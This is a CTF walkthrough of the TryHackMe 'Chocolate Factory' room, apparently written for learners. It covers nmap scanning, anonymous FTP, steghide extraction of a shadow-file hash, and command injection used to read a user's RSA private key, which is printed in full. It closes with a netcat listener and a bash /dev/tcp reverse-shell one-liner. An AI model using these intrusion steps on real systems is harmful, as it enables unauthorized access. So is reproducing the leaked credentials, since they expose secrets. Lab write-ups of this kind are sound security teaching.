# Chocolate Factory themed CTF writeup | Tryhackme.com



First scan the machine with nmap:
nmap -A -T5 -v <**ip**>

![nmap1](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/nmap1.png)

![nmap1](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/nmap2.png)  

The open ports:

- 21 - ftp
- 22 - ssh
- 80 - http 
- 100, 106, 109, 110, 111, 113, 119, 125 - these TCP ports display the same banner.

Anonymous FTP login is allowed so let’s try that and see what we find

![ftp](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/ftp.png)

Download gum_room.jpg to our machine. Maybe there is something hidden behind this picture. 
We can find it out with steghide.

Use: steghide extract -sf <**file**>

![steghide](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/steghide.png)

The txt seems to be a base64 encoded text so let’s decode it in the terminal\
` cat b64.txt | base64 -d `

It seems to be an etc/shadow file and there is a user named charlie\
*charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::*


Let’s find the subdomains using gobuster\
`gobuster dir -u http://<ip>/ -w /usr/share/dirb/wordlists/common.txt -x php,html,sh,txt`

![gobuster](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/gobuster1.png)

First check out **Index.html**. \ **Home.php** also seems interesting, let’s navigate there aswell.

Index.html is a login page, let’s see the source code.
![index](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/website_indexhtml.png)

Index.html is a login page, let’s see the source code.

![src_code](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/source_code.png)

**Validate.php:**

<script>alert('Incorrect Credentials');</script><script>window.location='index.html'</script>
Validate


Now to the interesting part: **home.php**

![homephp](https://github.com/varkolyd/ctf_writeups/blob/main/THM%20-%20Chocolate%20Factory/Images/homephp.png)

There is a command injection page in here. Let’s try a few

`ls:`

    home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php 

    So there is a key in this directory. Let’s see what it has.

`cat key_rev_key`

    copy it and echo to terminal to see it better 

    Enter your name: %slaksdhfas congratulations you have found the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' Keep its safeBad name!

    See other directories aswell.

`pwd:`

    /var/www/html

`ls /home`

    user named charlie

`ls /home/charlie`

    teleport teleport.pub user.txt

user.txt is not readable
teleport.pub is the ssh public key and teleport is the private key


`cat /home/charlie/teleport`

 `-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
 -----END RSA PRIVATE KEY-----`


Let’s save it to a txt file.
The format is bad, can’t decrypt with john and can’t connect to ssh so let’s find an alternative way, if we don’t want to spend time finding the right format.


Alternative way:
Reverse shell

on attacker machine
`nc -nvlp 4444`

on webserver’s command line
`bash -c 'exec bash -i &>/dev/tcp/{IP}/4444 <&1'`


##### author: Dániel Varkoly
